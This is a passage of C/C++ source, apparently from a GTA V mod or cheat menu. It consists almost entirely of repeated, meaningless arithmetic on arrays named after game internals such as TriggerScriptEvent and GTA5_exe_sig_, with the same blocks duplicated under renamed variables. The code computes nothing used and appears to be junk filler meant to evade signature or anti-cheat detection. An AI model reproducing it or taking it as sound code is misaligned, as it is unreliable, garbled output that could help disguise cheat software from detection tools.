				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			Extern_Reader::LOG::arquivoTXT = XMLPath;

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
